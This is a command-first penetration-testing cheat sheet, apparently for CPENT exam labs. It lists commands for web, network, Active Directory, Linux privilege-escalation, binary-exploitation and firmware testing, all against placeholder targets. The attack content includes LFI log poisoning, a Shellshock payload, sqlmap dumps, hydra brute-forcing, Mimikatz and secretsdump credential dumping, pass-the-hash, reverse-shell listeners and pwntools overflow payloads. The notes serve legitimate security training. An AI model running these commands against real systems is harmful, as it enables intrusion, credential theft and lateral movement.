# CPENT Practical Testing — Command-First Notes

> Use only against systems you are authorized to test.
>
> **Format:** each subsection has commands first and one short line explaining what they are for.

---

# 1. WEB TESTING

## 1.1 HTTP Enumeration

```bash
nmap -p80,443 -sC -sV <TARGET>
```
Basic HTTP/HTTPS service and version enumeration.

```bash
nmap -p80 --script http-enum <TARGET>
```
Finds common web paths and applications.

```bash
nmap -p80 --script http-methods --script-args http-methods.url-path=/ <TARGET>
```
Checks supported HTTP methods.

```bash
curl -i http://<TARGET>/
curl -I http://<TARGET>/
```
Quickly inspect HTTP headers and response information.

```bash
whatweb http://<TARGET>/
```
Identifies web technologies, frameworks and versions.

## 1.2 Directory / File Enumeration

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Fuzzes for hidden directories and files.

```bash
dirb http://<TARGET> /usr/share/wordlists/dirb/common.txt
```
Enumerates common web directories and files.

```bash
nikto -h http://<TARGET>
```
Checks the web server for common misconfigurations and known issues.

```bash
feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
```
Alternative content discovery tool when ffuf/dirb misses useful paths.

```bash
ffuf -u http://<TARGET>/FUZZ -w <WORDLIST> -fc 404
```
Filters out known 404 responses during fuzzing.

## 1.3 WordPress Enumeration

```bash
wpscan --url http://<TARGET>
```
Detects WordPress information and common issues.

```bash
wpscan --url http://<TARGET> --enumerate p,t,u
```
Enumerates plugins, themes and users.

```bash
wpscan --url http://<TARGET> --plugins-detection aggressive
```
Performs deeper WordPress plugin detection.

```bash
wpscan --url http://<TARGET> --enumerate vp,vt
```
Checks vulnerable plugins and themes.

## 1.4 Joomla / CMS Enumeration

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Finds Joomla or other CMS directories.

```bash
curl -I http://<TARGET>/joomla/
```
Checks the discovered Joomla path and headers.

```bash
nmap -sC -sV -p80 <TARGET>
```
Attempts to identify the CMS and web-server version.

```bash
searchsploit <CMS> <VERSION>
```
Searches local Exploit-DB data for matching public exploits.

## 1.5 CMS / Plugin Version → Vulnerability

```bash
searchsploit wordpress <PLUGIN>
```
Searches for known exploits for a WordPress plugin.

```bash
searchsploit <PRODUCT> <VERSION>
```
Maps a discovered product/version to known exploits.

```bash
nmap -sV -p80,443 <TARGET>
```
Gets versions needed for vulnerability research.

## 1.6 LFI

```bash
curl "http://<TARGET>/<LFI_ENDPOINT>?file=/etc/passwd"
```
Tests whether a file parameter can read local files.

```bash
curl "http://<TARGET>/<LFI_ENDPOINT>?file=../../../../etc/passwd"
```
Tests basic path traversal for local file disclosure.

```bash
curl "http://<TARGET>/<DEBUG_PATH>?file=/etc/passwd"
```
Tests a debug/file-view endpoint for LFI.

```bash
curl "http://<TARGET>/<LFI_ENDPOINT>?file=/var/log/auth.log"
```
Checks whether authentication logs are readable through LFI.

## 1.7 LFI → Log Poisoning

```bash
ssh <USER>@<TARGET>
```
Checks whether SSH is available as a log-poisoning path.

```bash
curl -H 'User-Agent: <TEST_PAYLOAD>' http://<TARGET>/<WEB_ENDPOINT>
```
Places controlled input into a server-side web log.

```bash
curl "http://<TARGET>/<LFI_ENDPOINT>?file=/var/log/<TARGET_LOG>"
```
Checks whether the poisoned log can be included.

```bash
curl "http://<TARGET>/<LFI_ENDPOINT>?file=/var/log/<TARGET_LOG>&cmd=id"
```
Validates command execution if the included log is interpreted as code.

## 1.8 Shellshock / CGI

```bash
nmap -p80 --script http-enum <TARGET>
```
Finds CGI paths that may be worth testing.

```bash
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/<SCRIPT> <TARGET>
```
Checks a CGI endpoint for Shellshock.

```bash
curl -i http://<TARGET>/cgi-bin/<SCRIPT>
```
Checks whether the CGI endpoint is reachable.

```bash
curl -H 'User-Agent: () { :;}; echo; echo SHELLSHOCK_TEST' http://<TARGET>/cgi-bin/<SCRIPT>
```
Sends a non-destructive Shellshock validation payload.

```bash
nc -lvnp <PORT>
```
Listens for an authorized lab callback during exploitation testing.

## 1.9 SQL Injection

```bash
curl -i "http://<TARGET>/<PATH>?<PARAM>=test"
```
Checks the baseline response before SQLi testing.

```bash
sqlmap -u "http://<TARGET>/<PATH>?<PARAM>=test" --batch
```
Tests the parameter for SQL injection automatically.

```bash
sqlmap -u "http://<TARGET>/<PATH>?<PARAM>=test" --dbs --batch
```
Enumerates databases after SQLi is confirmed.

```bash
sqlmap -u "http://<TARGET>/<PATH>?<PARAM>=test" -D <DATABASE> --tables --batch
```
Enumerates tables in a selected database.

```bash
sqlmap -u "http://<TARGET>/<PATH>?<PARAM>=test" -D <DATABASE> -T <TABLE> --columns --batch
```
Enumerates columns in a selected table.

```bash
sqlmap -u "http://<TARGET>/<PATH>?<PARAM>=test" -D <DATABASE> -T <TABLE> --dump --batch
```
Extracts table data in an authorized lab.

## 1.10 File Upload Testing

```bash
curl -i -X POST -F "file=@test.txt" http://<TARGET>/<UPLOAD_ENDPOINT>
```
Establishes normal upload behavior with a harmless file.

```bash
curl -i -X POST -F "file=@test.php" http://<TARGET>/<UPLOAD_ENDPOINT>
```
Tests whether executable content is accepted.

```bash
curl -i -X POST -F "file=@test.php" -F "allow_all=1" http://<TARGET>/<UPLOAD_ENDPOINT>
```
Tests whether a client-side authorization flag can be tampered with.

```bash
curl -i http://<TARGET>/<UPLOAD_PATH>/test.php
```
Checks whether an uploaded file is directly accessible.

**Burp Suite → Proxy → Intercept → modify upload parameters → Forward**

Tests server-side validation by changing request values in transit.

## 1.11 Web Shell Validation

```bash
curl "http://<TARGET>/<SHELL>?cmd=whoami"
```
Confirms the executing account.

```bash
curl "http://<TARGET>/<SHELL>?cmd=id"
```
Checks UID and group privileges.

```bash
curl "http://<TARGET>/<SHELL>?cmd=pwd"
```
Shows the current working directory.

```bash
curl "http://<TARGET>/<SHELL>?cmd=uname%20-a"
```
Checks kernel and OS information.

## 1.12 HTTP Methods / TRACE

```bash
curl -i -X OPTIONS http://<TARGET>/
```
Shows HTTP methods accepted by the endpoint.

```bash
curl -i -X TRACE http://<TARGET>/
```
Checks whether TRACE is enabled.

```bash
nmap -sC -sV -p80 <TARGET>
```
Uses NSE scripts to identify web-server details and risky configurations.

## 1.13 WebSocket Testing

**Burp Suite → Proxy → WebSockets history**

Captures WebSocket messages for inspection.

**Burp Suite → Send WebSocket message to Repeater**

Allows controlled replay and modification of WebSocket messages.

**Burp Suite → Repeater → modify user/role/object IDs**

Tests authorization and object-level access controls.

**Burp Suite → Repeater → replay workflow messages in a different order**

Tests business-logic and workflow-state validation.

## 1.14 Business Logic / Account Takeover

**Burp Suite → capture password-reset request**

Finds the parameters controlling password-reset behavior.

**Burp Suite → modify username/user ID/role parameter**

Tests whether server-side authorization is tied to the correct account.

**Burp Suite → replay the same request**

Tests for replay and state-validation weaknesses.

**Burp Suite → compare response before/after parameter changes**

Identifies unauthorized changes in application behavior.

## 1.15 AI Chatbot / ChatOps Testing

**Register low-privileged account → open chatbot → inspect requests in Burp**

Maps chatbot commands and their backend requests.

**Burp Suite → WebSocket history → inspect reset-password messages**

Finds password-reset commands carried over WebSocket.

**Replay the command with a different target identifier**

Tests whether the server trusts a client-supplied target account.

**Repeat the request and compare server responses**

Checks for replayable business-logic flaws.

## 1.16 Debug Interface / File Disclosure

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Searches for hidden debug/development paths.

```bash
curl -i http://<TARGET>/<DEBUG_PATH>/debug-view.php
```
Checks whether the debug endpoint is accessible.

```bash
curl "http://<TARGET>/<DEBUG_PATH>/debug-view.php?file=/etc/passwd"
```
Tests arbitrary file disclosure through the debug endpoint.

## 1.17 Web Evidence / Useful Inspection

```bash
curl -s http://<TARGET>/<PATH> | tee response.txt
```
Saves an HTTP response for later analysis.

```bash
curl -s http://<TARGET>/<PATH> | grep -iE 'pass|key|token|secret|debug|admin'
```
Quickly searches a response for interesting strings.

```bash
grep -RniE 'pass(word)?|secret|token|key|admin|debug' <WEB_FILES>
```
Searches downloaded web files for sensitive strings.

---

# 2. NETWORK TESTING

## 2.1 Host Discovery

```bash
nmap -sn <AUTHORIZED_SUBNET>
```
Finds live hosts without a full port scan.

```bash
nmap -Pn <TARGET>
```
Scans a host when normal host discovery is blocked.

```bash
nmap -sn -PR <AUTHORIZED_SUBNET>
```
Uses ARP discovery on a local Ethernet network.

## 2.2 Full Port Scan

```bash
nmap -p- <TARGET>
```
Scans all TCP ports.

```bash
nmap -p- -sV <TARGET>
```
Scans all TCP ports and identifies services.

```bash
nmap -p <PORTS> -sC -sV <TARGET>
```
Runs default scripts and version detection on selected ports.

## 2.3 UDP Enumeration

```bash
nmap -sU --top-ports 100 <TARGET>
```
Checks common UDP services.

```bash
nmap -sU -p <PORTS> -sV <TARGET>
```
Performs targeted UDP service detection.

## 2.4 Service Enumeration

```bash
nmap -sC -sV <TARGET>
```
Performs standard service and NSE enumeration.

```bash
nmap -A <TARGET>
```
Combines several aggressive discovery features when appropriate for the lab.

## 2.5 SMB

```bash
nmap -p445 --script smb-protocols <TARGET>
```
Checks supported SMB versions.

```bash
nmap -p445 --script smb-os-discovery <TARGET>
```
Attempts to identify the Windows OS and domain information.

```bash
nxc smb <TARGET>
```
Enumerates SMB host/domain information.

```bash
nxc smb <TARGET> -u <USER_LIST> -p <PASSWORD_LIST>
```
Tests authorized SMB credential spraying.

```bash
smbclient -L //<TARGET>/ -N
```
Lists accessible SMB shares without credentials when anonymous access is allowed.

```bash
smbclient //<TARGET>/<SHARE> -U <USER>
```
Connects to a discovered SMB share.

```bash
enum4linux-ng -A <TARGET>
```
Performs broader SMB/Windows enumeration.

## 2.6 NetBIOS

```cmd
nbtstat -A <TARGET_IP>
```
Enumerates NetBIOS names, services and the 16th-byte type information.

```bash
nmap -p137,138,139 --script nbstat <TARGET>
```
Enumerates NetBIOS information using Nmap.

## 2.7 SSH

```bash
nmap -p22 -sC -sV <TARGET>
```
Enumerates SSH version and common SSH information.

```bash
ssh <USER>@<TARGET>
```
Connects to SSH with discovered credentials or keys.

```bash
ssh -i <KEY> <USER>@<TARGET>
```
Connects using an SSH private key.

```bash
ssh -V
```
Displays the local OpenSSH client version.

```bash
scp <FILE> <USER>@<TARGET>:/tmp/
```
Transfers a file to the target.

```bash
scp <USER>@<TARGET>:/path/to/file ./
```
Copies a file from the target.

## 2.8 SSH Credential Testing

```bash
hydra -L usernames.txt -P passwords.txt ssh://<TARGET>
```
Tests an authorized username/password list against SSH.

```bash
hydra -l <USER> -P passwords.txt ssh://<TARGET>
```
Tests a password list for one known SSH user.

## 2.9 RDP

```bash
nmap -p3389 -sV <TARGET>
```
Identifies the RDP service and version.

```bash
nmap -p3389 --script rdp-ntlm-info <TARGET>
```
Extracts RDP/NTLM information such as computer naming data.

```bash
hydra -L usernames.txt -P passwords.txt rdp://<TARGET>
```
Tests an authorized credential list against RDP.

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
```
Connects to RDP using discovered credentials.

```bash
rdesktop -u <USER> -p '<PASSWORD>' <TARGET>
```
Alternative RDP client for connecting to an RDP service.

## 2.10 WinRM

```bash
nmap -p5985,5986 -sV <TARGET>
```
Checks WinRM HTTP/HTTPS services.

```bash
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
```
Opens a PowerShell session through WinRM.

## 2.11 Windows Enumeration After Access

```powershell
whoami
```
Shows the current Windows identity.

```powershell
hostname
```
Shows the machine name.

```powershell
ipconfig /all
```
Shows interfaces, IPs, DNS and network information.

```powershell
route print
```
Shows Windows routing information.

```powershell
net user
```
Lists local users.

```powershell
net localgroup administrators
```
Lists local administrators.

```powershell
net view
```
Enumerates visible Windows shares/hosts.

```powershell
Get-ChildItem C:\ -Force
```
Lists files and directories including hidden entries.

## 2.12 Active Directory Enumeration

```powershell
Get-ADUser -Filter * | Select Name,SamAccountName
```
Lists domain users and their account names.

```powershell
Get-ADComputer -Filter * | Select Name,SamAccountName
```
Lists domain computers.

```powershell
Get-ADGroup -Filter * | Select Name
```
Lists domain groups.

```powershell
Get-ADComputer <COMPUTER> -Properties ManagedBy,IPv4Address
```
Finds who manages a computer and its IP address.

```powershell
Get-ADComputer <COMPUTER> -Properties msDS-KrbTgtLink
```
Checks RODC/KRBTGT linkage information.

## 2.13 AS-REP Roasting

```bash
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```
Requests AS-REP hashes for accounts without Kerberos pre-authentication.

```bash
john <HASH_FILE> -w=<WORDLIST>
```
Cracks recovered Kerberos hashes offline.

## 2.14 Cached Domain Credentials

```text
Mimikatz → privilege::debug
```
Enables the privileges commonly needed for credential-dumping operations.

```text
Mimikatz → sekurlsa::cache
```
Examines cached domain logon credentials where supported.

```text
Mimikatz → lsadump::sam
```
Dumps local SAM account hashes when running with sufficient privileges.

## 2.15 Pass-the-Hash / Windows Lateral Movement

```text
Mimikatz → sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>
```
Creates an authentication context using an NTLM hash instead of the password.

```text
psexec \\<TARGET> cmd.exe
```
Uses an existing privileged Windows authentication context to obtain a remote shell.

```bash
impacket-psexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET>
```
Uses Impacket to obtain a remote Windows service-based shell with valid credentials.

```bash
winexe -U '<DOMAIN>/<USER>%<PASSWORD>' //<TARGET> 'cmd.exe'
```
Executes commands remotely over SMB in compatible lab environments.

## 2.16 Linux Network Enumeration

```bash
ip addr
```
Shows all network interfaces and IP addresses.

```bash
ip route
```
Shows routes and reachable networks.

```bash
ss -lntup
```
Lists listening TCP/UDP services and processes.

```bash
arp -a
```
Shows the local ARP cache.

## 2.17 Pivot — SSH Dynamic Forwarding

```bash
ssh -D 1080 <USER>@<PIVOT>
```
Creates a SOCKS proxy through the compromised SSH host.

```bash
proxychains nmap -sT -Pn <INTERNAL_TARGET>
```
Runs TCP-based tools through the SSH SOCKS proxy.

```bash
proxychains curl http://<INTERNAL_TARGET>:<PORT>/
```
Accesses an internal HTTP service through the SOCKS proxy.

## 2.18 Pivot — SSH Local Port Forward

```bash
ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<REMOTE_PORT> <USER>@<PIVOT>
```
Maps an internal target service to a local attacker port.

```bash
curl http://127.0.0.1:<LOCAL_PORT>/
```
Accesses the forwarded internal service locally.

## 2.19 Pivot — SSH Remote Port Forward

```bash
ssh -R <REMOTE_PORT>:<ATTACKER_HOST>:<ATTACKER_PORT> <USER>@<PIVOT>
```
Creates a reverse tunnel from the pivot back toward the attacker.

## 2.20 Pivot — SSHuttle

```bash
sshuttle -r <USER>@<PIVOT> <INTERNAL_SUBNET>
```
Routes traffic to an internal subnet through the SSH pivot.

```bash
sshuttle -r <USER>@<PIVOT> <SUBNET1> <SUBNET2>
```
Routes multiple internal subnets through one SSH pivot.

```bash
nmap -sC -sV <INTERNAL_TARGET>
```
Scans an internal target after routing is established.

## 2.21 Pivot — Chisel

```bash
./chisel server --reverse -p <PORT>
```
Starts a Chisel server that accepts reverse tunnels.

```bash
./chisel client <ATTACKER>:<PORT> R:socks
```
Creates a reverse SOCKS tunnel from the pivot to the attacker.

```bash
proxychains nmap -sT -Pn <INTERNAL_TARGET>
```
Uses the Chisel SOCKS tunnel for internal TCP scanning.

```bash
./chisel client <ATTACKER>:<PORT> <LOCAL_PORT>:<INTERNAL_TARGET>:<REMOTE_PORT>
```
Creates a Chisel port-forward to an internal service.

## 2.22 Pivot — Upload Tools to the Pivot

```bash
scp ./nmap <USER>@<PIVOT>:/tmp/nmap
```
Uploads a standalone tool to the compromised pivot.

```bash
chmod +x /tmp/nmap
```
Makes the uploaded binary executable.

```bash
/tmp/nmap -n -p- -sV <INTERNAL_TARGET>
```
Performs a full internal scan directly from the pivot.

## 2.23 Double Pivot

```text
ATTACKER → PIVOT 1 → PIVOT 2 → INTERNAL NETWORK
```
Use a second compromised host when the final network is not reachable through the first pivot alone.

```bash
ssh -D 1080 <USER>@<PIVOT1>
```
Creates the first SOCKS pivot.

```bash
ssh -J <USER>@<PIVOT1> <USER>@<PIVOT2>
```
Uses SSH ProxyJump to reach a second pivot through the first host.

```bash
ssh -D 1080 <USER>@<PIVOT2>
```
Creates a SOCKS proxy from the second pivot.

## 2.24 Pivot Troubleshooting

```bash
ip addr
ip route
```
Confirm interfaces and routes on every pivot.

```bash
ss -lntup
```
Check whether forwarding/listening services are active.

```bash
ping -c 2 <INTERNAL_IP>
```
Checks basic reachability from the current pivot.

```bash
nmap -Pn -p <PORT> <INTERNAL_TARGET>
```
Tests a specific internal service when ICMP discovery fails.

## 2.25 Modbus / OT Packet Analysis

```bash
ip addr
```
Identifies interfaces available for OT traffic capture.

```bash
tcpdump -i <INTERFACE> -nn -s0 port 502 -w modbus.pcap
```
Captures Modbus/TCP traffic into a PCAP file.

```bash
scp <USER>@<TARGET>:/path/to/modbus.pcap ./
```
Transfers the capture to the analysis machine.

```bash
wireshark modbus.pcap
```
Analyzes Modbus transactions, registers and Ethernet information.

```bash
tshark -r modbus.pcap -Y modbus
```
Filters Modbus packets from a PCAP in the terminal.

## 2.26 Network File Transfer / Temporary Server

```bash
python3 -m http.server <PORT>
```
Starts a simple HTTP server for authorized lab file transfer.

```bash
curl http://<ATTACKER>:<PORT>/<FILE> -o /tmp/<FILE>
```
Downloads a lab file from the attacker HTTP server.

```bash
scp <FILE> <USER>@<TARGET>:/tmp/
```
Transfers files over SSH.

---

# 3. BINARY TESTING

## 3.1 Identify Binary

```bash
file <BINARY>
```
Identifies architecture and binary format.

```bash
strings <BINARY>
```
Extracts printable strings.

```bash
strings -a <BINARY> | less
```
Reviews all printable strings interactively.

## 3.2 Binary Protections

```bash
checksec --file=<BINARY>
```
Checks NX, PIE, Canary, RELRO and other common mitigations.

## 3.3 Symbols / Functions

```bash
nm <BINARY>
```
Lists symbols and function addresses.

```bash
nm -C <BINARY>
```
Demangles C++ symbols.

```bash
nm <BINARY> | grep -i win
```
Searches for useful functions such as win().

## 3.4 ELF Headers / Sections

```bash
readelf -h <BINARY>
```
Shows ELF architecture and header information.

```bash
readelf -S <BINARY>
```
Lists ELF sections and offsets.

```bash
readelf -s <BINARY>
```
Lists ELF symbols.

```bash
readelf -l <BINARY>
```
Shows program segments and memory permissions.

## 3.5 Disassembly

```bash
objdump -d <BINARY>
```
Disassembles executable sections.

```bash
objdump -d <BINARY> | less
```
Reviews disassembly interactively.

```bash
objdump -d <BINARY> | grep -A20 '<win>'
```
Shows the code around a selected function.

## 3.6 GDB — Basic Dynamic Analysis

```bash
gdb <BINARY>
```
Starts the debugger.

```gdb
break main
```
Sets a breakpoint at main().

```gdb
run
```
Runs the binary until a breakpoint or crash.

```gdb
continue
```
Continues execution after a breakpoint.

```gdb
info registers
```
Displays CPU register values.

```gdb
info functions
```
Lists known functions.

```gdb
disassemble main
```
Disassembles main().

```gdb
disassemble <FUNCTION>
```
Disassembles a selected function.

```gdb
p system
```
Displays the address/value associated with system().

```gdb
find /b <START>, <END>, <VALUE>
```
Searches a memory range for a byte value.

```gdb
find <START>, <END>, "/bin/sh"
```
Searches memory for the /bin/sh string.

```gdb
x/s <ADDRESS>
```
Displays memory at an address as a string.

```gdb
x/20gx <ADDRESS>
```
Displays nearby memory as 64-bit hexadecimal values.

## 3.7 Fuzzing / Cyclic Pattern

```python
from pwn import *
print(cyclic(500))
```
Generates a unique cyclic pattern for overflow testing.

```bash
python3 pattern.py
```
Runs the cyclic-pattern generator.

```gdb
run
```
Runs the vulnerable program with the test input attached.

```gdb
info registers
```
Checks which register was overwritten after the crash.

## 3.8 Find EIP/RIP Offset

```python
from pwn import *
print(cyclic_find(<EIP_VALUE>))
```
Calculates the offset to the 32-bit instruction pointer.

```python
from pwn import *
print(cyclic_find(<RIP_VALUE>, n=8))
```
Calculates the offset for a 64-bit instruction pointer.

## 3.9 Ret2win

```bash
nm <BINARY> | grep -i win
```
Finds the hidden win function address.

```bash
objdump -d <BINARY> | grep -A20 '<win>'
```
Inspects the win function before building the payload.

```python
from pwn import *
offset = <OFFSET>
win = <WIN_ADDRESS>
payload = b"A" * offset + p64(win)
```
Builds a basic 64-bit ret2win payload.

```python
from pwn import *
io = remote("<TARGET>", <PORT>)
io.sendline(payload)
io.interactive()
```
Sends the exploit to an authorized remote lab service.

## 3.10 Remote Buffer Overflow

```python
from pwn import *
io = remote("<TARGET>", <PORT>)
io.sendline(b"A" * <OFFSET> + p64(<RETURN_ADDRESS>))
io.interactive()
```
Tests controlled return-address overwrite against a vulnerable lab service.

## 3.11 32-bit Payload Note

```python
payload = b"A" * <OFFSET> + p32(<RETURN_ADDRESS>)
```
Uses a 32-bit packed address for 32-bit binaries.

## 3.12 Binary Logic / Reverse Engineering

```bash
strings <BINARY> | less
```
Looks for prompts, filenames, URLs and useful strings.

```bash
nm <BINARY>
```
Maps available functions and symbols.

```bash
objdump -d <BINARY> | less
```
Reviews program control flow at assembly level.

```bash
gdb <BINARY>
```
Runs the program dynamically and inspects behavior.

## 3.13 Windows EXE Analysis

```bash
file Challenge3.exe
```
Identifies the executable format and architecture.

```bash
strings Challenge3.exe | less
```
Extracts useful strings from the Windows binary.

```bash
wine Challenge3.exe
```
Runs a Windows executable in a Linux lab environment when compatible.

## 3.14 Compiler / Build Information

```bash
strings <BINARY> | grep -iE 'gcc|clang|mingw|compiler'
```
Searches for compiler/build banners.

---

# 4. ACTIVE DIRECTORY / RODC

## 4.1 Find Domain / DC Information

```bash
nmap -p88,135,139,389,445,464,636,3268,3269 -sV <DC>
```
Identifies common Active Directory services.

```bash
nmap -p3389 --script rdp-ntlm-info <CLIENT>
```
Extracts client computer/DNS naming information.

## 4.2 AD User Enumeration

```powershell
Get-ADUser -Filter * | Select Name,SamAccountName
```
Lists domain users.

```powershell
Get-ADUser <USER> -Properties *
```
Shows detailed attributes for a domain user.

## 4.3 AD Computer Enumeration

```powershell
Get-ADComputer -Filter * | Select Name,SamAccountName
```
Lists domain computers.

```powershell
Get-ADComputer <COMPUTER> -Properties ManagedBy,IPv4Address
```
Finds the managing user and IP of a computer object.

## 4.4 AD Group Enumeration

```powershell
Get-ADGroup -Filter * | Select Name
```
Lists domain groups.

```powershell
Get-ADGroupMember '<GROUP>'
```
Lists members of a selected group.

## 4.5 ManagedBy / RODC Relationships

```powershell
Get-ADComputer <COMPUTER> -Properties ManagedBy,IPv4Address
```
Maps a computer/RODC to its managing user and IP.

```powershell
Get-ADComputer <COMPUTER> -Properties msDS-KrbTgtLink
```
Checks the RODC-specific KRBTGT linkage.

## 4.6 RODC Password Replication Policy

```powershell
Get-ADComputer <RODC> -Properties msDS-RevealOnDemandGroup | Select -ExpandProperty msDS-RevealOnDemandGroup
```
Shows principals allowed in the RODC Password Replication Policy.

```powershell
Get-ADComputer <RODC> -Properties msDS-NeverRevealGroup | Select -ExpandProperty msDS-NeverRevealGroup
```
Shows principals explicitly denied by the RODC replication policy.

## 4.7 AS-REP Roasting

```bash
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```
Requests AS-REP responses for accounts without pre-authentication.

```bash
john <HASH_FILE> -w=<WORDLIST>
```
Cracks the recovered AS-REP hashes offline.

## 4.8 RODC Credential / Hash Enumeration

```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<RODC>
```
Attempts authorized credential extraction from a compromised RODC.

```bash
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC>
```
Extracts domain-controller credential material when authorized and sufficiently privileged.

## 4.9 Credential Cracking

```bash
john <HASH_FILE> -w=<WORDLIST>
```
Cracks supported password hashes offline.

```bash
john <HASH_FILE> --format=NT --mask='?l?d?l?l?d?d?d'
```
Uses a targeted mask for an NT hash when the password pattern is known.

```bash
john --show <HASH_FILE>
```
Displays hashes already cracked by John.

## 4.10 Pass-the-Hash

```text
Mimikatz → privilege::debug
```
Enables required debugging privilege for credential operations.

```text
Mimikatz → lsadump::sam
```
Dumps local SAM hashes when privileged.

```text
Mimikatz → sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>
```
Creates a process authenticated with an NTLM hash.

```bash
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
```
Uses an NTLM hash for authorized remote Windows access.

## 4.11 RODC Key List Attack — Checklist

```text
1. Identify RODC
2. Enumerate RODC computer object
3. Check msDS-KrbTgtLink
4. Check Password Replication Policy
5. Identify cached principals
6. Test the documented Key List/RODC attack path in the lab
```
Use this sequence when an RODC/key-list challenge is presented.

---

# 5. LINUX PRIVILEGE ESCALATION

## 5.1 Identity / OS

```bash
whoami
```
Shows the current user.

```bash
id
```
Shows UID, GID and group memberships.

```bash
uname -a
```
Shows kernel and architecture information.

```bash
cat /etc/os-release
```
Shows the Linux distribution and version.

```bash
hostname
```
Shows the hostname.

## 5.2 Sudo

```bash
sudo -l
```
Lists commands the current user can run with sudo.

```bash
sudo -i
```
Attempts to open a root login shell when permitted.

```bash
sudo su
```
Attempts to switch to root through sudo.

## 5.3 SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```
Finds SUID-enabled files.

```bash
find / -perm -u=s -type f 2>/dev/null
```
Alternative SUID enumeration.

```bash
ls -la <SUID_BINARY>
```
Checks permissions and ownership of a suspicious SUID file.

## 5.4 Capabilities

```bash
getcap -r / 2>/dev/null
```
Finds files with Linux capabilities.

```bash
getcap <BINARY>
```
Checks capabilities on one binary.

## 5.5 Processes / Services

```bash
ps aux
```
Lists running processes.

```bash
ps auxww
```
Shows full process command lines.

```bash
ss -lntup
```
Lists listening network services and processes.

```bash
systemctl list-units --type=service --state=running
```
Lists running systemd services.

## 5.6 Files / Credentials / Keys

```bash
find / -type f \( -name 'id_rsa' -o -name 'id_ecdsa' -o -name '*.key' \) 2>/dev/null
```
Searches for SSH private keys and key files.

```bash
find / -type f -name '*.conf' 2>/dev/null
```
Finds configuration files worth reviewing.

```bash
grep -RniE 'pass(word)?|secret|token|key|credential|api[_-]?key' /etc /opt /var/www 2>/dev/null
```
Searches common locations for recoverable secrets.

```bash
cat /etc/passwd
```
Lists local accounts and login shells.

```bash
cat /etc/shadow
```
Reads password hashes when sufficient privileges exist.

```bash
unshadow passwd.txt shadow.txt > unshadow.txt
```
Combines passwd and shadow files for John.

```bash
john unshadow.txt -w=<WORDLIST>
```
Attempts offline password cracking.

## 5.7 File / Permission Enumeration

```bash
find / -writable -type f 2>/dev/null
```
Finds writable files.

```bash
find / -type f -perm -o+w 2>/dev/null
```
Finds world-writable files.

```bash
ls -la <PATH>
```
Checks file ownership and permissions.

## 5.8 Kernel / Local Privilege Escalation

```bash
uname -a
```
Collects kernel information for vulnerability matching.

```bash
searchsploit '<KERNEL_VERSION>'
```
Searches local exploit data for matching kernel vulnerabilities.

```bash
./<LAB_EXPLOIT>
```
Runs an exploit only after confirming the target is an authorized vulnerable lab system.

## 5.9 CVE-2021-3493 / OverlayFS

```bash
uname -a
```
Checks whether the kernel matches the vulnerable environment.

```bash
scp <EXPLOIT> <USER>@<TARGET>:/tmp/
```
Transfers a compiled lab exploit to the target.

```bash
chmod +x /tmp/<EXPLOIT>
```
Makes the uploaded exploit executable.

```bash
/tmp/<EXPLOIT>
```
Runs the authorized lab privilege-escalation exploit.

## 5.10 CVE-2026-31431 / copy-fail

```bash
ssh <USER>@<TARGET>
uname -a
```
Checks the target kernel before testing the local privilege-escalation path.

```bash
python3 copyfail.py
```
Runs the copy-fail lab exploit in the authorized lab environment.

```bash
id
cat /root/root.txt
```
Verifies root access and reads the authorized challenge file.

## 5.11 CVE-2016-5195 / Dirty COW

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```
Compiles the Dirty COW lab exploit source.

```bash
chmod +x dirty
```
Makes the compiled exploit executable.

```bash
./dirty
```
Runs the exploit in the authorized vulnerable lab.

---

# 6. IOT / FIRMWARE TESTING

## 6.1 Acquire Firmware

```bash
scp <USER>@<TARGET>:/path/to/<FIRMWARE> ./
```
Copies a firmware image to the analysis machine.

## 6.2 Identify Firmware

```bash
file <FIRMWARE>
```
Identifies the firmware/container format.

```bash
binwalk <FIRMWARE>
```
Scans the image for embedded filesystems and components.

```bash
binwalk -e <FIRMWARE>
```
Extracts recognized embedded filesystems and files.

```bash
binwalk -Me <FIRMWARE>
```
Recursively extracts nested firmware components.

## 6.3 Firmware Offsets / Carved Files

```bash
binwalk <FIRMWARE> | less
```
Reviews detected signatures, offsets and sizes.

```bash
dd if=<FIRMWARE> of=carved.bin bs=1 skip=<OFFSET> count=<SIZE>
```
Carves a specific region from a firmware image.

```bash
file carved.bin
```
Identifies the carved object.

## 6.4 Filesystem Enumeration

```bash
find _<FIRMWARE>.extracted -type f
```
Lists extracted firmware files.

```bash
find _<FIRMWARE>.extracted -type f | less
```
Reviews the extracted filesystem interactively.

```bash
ls -la _<FIRMWARE>.extracted/
```
Inspects the extraction directory.

## 6.5 Credentials / Secrets

```bash
grep -RniE 'pass(word)?|passwd|secret|key|token|credential|login|admin' <EXTRACTED_DIR>
```
Searches the firmware filesystem for likely secrets.

```bash
strings <FILE>
```
Extracts readable strings from firmware components.

```bash
strings <FILE> | grep -iE 'password|passwd|admin|key|token|secret'
```
Filters strings for likely credential material.

```bash
cat <EXTRACTED_DIR>/etc/passwd
```
Checks embedded Linux account information.

```bash
cat <EXTRACTED_DIR>/etc/shadow
```
Checks embedded password hashes when present.

## 6.6 SQLite / Embedded Databases

```bash
sqlite3 <DATABASE>
```
Opens an embedded SQLite database.

```sql
.tables
```
Lists database tables.

```sql
.schema <TABLE>
```
Shows the schema of a selected table.

```sql
SELECT * FROM <TABLE>;
```
Displays records from a selected table.

